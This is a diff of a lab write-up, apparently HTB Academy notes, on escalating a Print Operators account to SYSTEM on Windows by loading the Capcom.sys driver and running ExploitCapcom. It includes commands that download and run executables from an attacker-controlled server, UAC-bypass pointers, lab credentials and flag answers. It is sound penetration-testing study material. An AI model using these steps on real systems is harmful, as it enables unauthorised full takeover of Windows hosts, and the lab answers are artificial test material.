@@ -307,36 +307,168 @@ Results: Dll_abus3_ftw!
 **RDP to  with user "printsvc" and password "HTB_@cademy_stdnt!". Follow the steps in this section to escalate privileges to SYSTEM, and submit the contents of the flag.txt file on administrator's Desktop. Necessary tools for both methods can be found in the C:\Tools directory, or you can practice compiling and uploading them on your own.**
 
 ```
-xfreerdp /v:10.129.43.31 /u:printsvc /p:HTB_@cademy_stdnt! /cert:ignore
+xfreerdp /v:10.129.217.105 /u:printsvc /p:HTB_@cademy_stdnt! /cert:ignore
+```
 
-# Generating the 
+Check our group membershipts:
 
+```powershell
+whoami /groups
+```
+
+We see Print Operators, which usually has the SeLoadDriverPrivilege. However when we check our permissions is not listed:
+
+```powershell
+whoami /priv
+```
+
+
+If we issue the command `whoami /priv`, and don't see the `SeLoadDriverPrivilege` from an unelevated context, we will need to bypass UAC. 
+	- You can bypass it with  [UACMe](https://github.com/hfiref0x/UACME) repo features or any similar code approach.
+	- You can also bypass it from user interface. Open a powershell with administrator permissions. 	
+
+ If disabled, enabled SeLoadDriverPrivilege. Now, next troubleshooting is that the `SeLoadDriverPrivilege` may be Disabled. To enable it, we will need the following:
+
+- The executable `EnableSeLoadDriverPrivilege.exe` that we can compile using the forked repo [https://github.com/amandaguglieri/enabling-privileges](https://github.com/amandaguglieri/enabling-privileges).  
+- The file Capcom.sys. I've forked it to [https://github.com/amandaguglieri/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/amandaguglieri/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
+- The DriverView.exe utility, officially available at [https://www.nirsoft.net/utils/driverview.html](https://www.nirsoft.net/utils/driverview.html) and in my case, also uploaded to [my repo](https://github.com/amandaguglieri/hackinglife/blob/main/docs/files/DriverView.exe).
+
+Compiling `EnableSeLoadDriverPrivilege.exe` . I've set up Visual Studio 2022 in a Windows Virtual Machine. 
+
+
+```
+# Clone my forked repo
+https://github.com/amandaguglieri/enabling-privileges
+
+# Add the following libraries to the EnableSeLoadDriverPrivilege.cpp file
+#include <windows.h>
+#include <assert.h>
+#include <winternl.h>
+#include <sddl.h>
+#pragma comment(lib,"advapi32.lib") 
+#pragma comment(lib,"user32.lib") 
+#pragma comment(lib,"Ntdll.lib")
+#include <stdio.h>
+#include "tchar.h"
+
+# Now, from the terminal (CTRL+ñ), compile:
+cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
+# This will generate the required EnableSeLoadDriverPrivilege.exe. Save it to the folder from where you want to serve the payload to the target host.
+```
+
+Download the other required files (`Capcom.sys`  and `DriverView.exe`) to the folder from where you want to serve the payload to the target host.
+
+```
+# Download Capcom.sys
+wget https://github.com/amandaguglieri/enabling-privileges/blob/master/Capcom.sys
+
+# Download DriverView.exe
+wget https://github.com/amandaguglieri/hackinglife/blob/main/docs/files/DriverView.exe
+```
+
+Serve the files to the target host:
+
+```
+python3 -m http.server 80
+```
+
+Download the files to the target host:
+
+
+```powershell
+# open a powershell terminal and change the directory for instance to C:\Tools
+cd C:\Tools
 wget http://10.10.14.39/EnableSeLoadDriverPrivilege.exe -outfile EnableSeLoadDriverPrivilege.exe
-
 wget http://10.10.14.39/Capcom.sys -outfile Capcom.sys
-
-
 wget http://10.10.14.39/DriverView.exe -outfile DriverView.exe
+```
 
-mkdir c:\test\
+Save the `Capcom.sys` driver from [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys), and save it to `C:\test`. If test does not exist, create it:
 
+```powershell
+mkdir c:\test
 copy Capcom.sys c:\test\Capcom.sys
+```
 
-reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\test\Capcom.sys" /f
+Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.
 
-reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1 /f
+```powershell
+reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\test\Capcom.sys"
 
-# Verify Driver is not Loaded
+reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
+```
+
+Using Nirsoft's [DriverView.exe](http://www.nirsoft.net/utils/driverview.html), we can verify that the Capcom.sys driver is not loaded.
+
+```powershell
 .\DriverView.exe /stext drivers.txt
 cat drivers.txt | Select-String -pattern Capcom
+```
 
+Run the `EnableSeLoadDriverPrivilege.exe` binary.
 
+```powershell
+.\EnableSeLoadDriverPrivilege.exe
+```
 
+The Output should be something like this:
 
+```powershell
+whoami:
+INLANEFREIGHT0\printsvc
 
+whoami /priv
+SeMachineAccountPrivilege        Disabled
+SeLoadDriverPrivilege            Enabled
+SeShutdownPrivilege              Disabled
+SeChangeNotifyPrivilege          Enabled by default
+SeIncreaseWorkingSetPrivilege    Disabled
+NTSTATUS: 00000000, WinError: 0
+```
 
+Next, verify that the Capcom driver is now listed.
 
+```powershell
+.\DriverView.exe /stext drivers.txt
+cat drivers.txt | Select-String -pattern Capcom
+```
 
-Invoke-FileUpload -Uri http://10.10.14.39:8000/upload -File C:\Tools\lala\drivers\etc\hosts
+The output should be something like this:
+
+```
+Driver Name           : Capcom.sys
+Filename              : C:\Tools\Capcom.sys
+```
+
+Now we will use the [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) tool for escalating privileges. I've cloned it into a windows virtual machine with Visual Studio 2022 installed (in my kali machine)
+
+- Open Visual Studio 2022. Clone the project. Once cloned, right click and select "Compile". It's important to change the architecture to x64 in order to compile.
+- Executable generated under "C:\Users\vboxuser\source\repos\ExploitCapcom\ExploitCapcom\x64\Release"
+
+Upload the `ExploitCapcom.exe` file to the target machine:
+
+```
+# from the attacking machine
+python3 -m http.server 80
+
+# from the target host
+wget http://$attackingIP/ExploitCapcom.exe -outfile ExploitCapcom.exe
+```
+
+Run the binary:
+
+```powershell
+.\ExploitCapcom.exe
+```
+
+This launches a shell with SYSTEM privileges. Now we print the flag.txt:
+
+```
+type c:\Users\Administrator\Desktop
+```
+
+If for some reason you can not read it, copy the file in order to read it.
+
+Results:  Pr1nt_0p3rat0rs_ftw!
 
 
